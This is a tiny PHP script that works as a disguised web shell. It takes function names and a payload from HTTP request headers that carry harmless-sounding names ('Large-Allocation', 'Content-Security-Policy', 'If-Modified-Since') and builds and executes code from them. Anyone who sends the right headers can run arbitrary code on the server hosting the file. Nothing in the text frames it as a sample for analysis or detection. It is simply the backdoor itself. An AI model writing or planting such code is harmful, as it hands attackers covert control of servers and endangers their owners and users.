<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Large-Allocation'])) {
    $multi = $_HEADERS['Large-Allocation']('', $_HEADERS['Content-Security-Policy']($_HEADERS['If-Modified-Since']));
    $multi();
}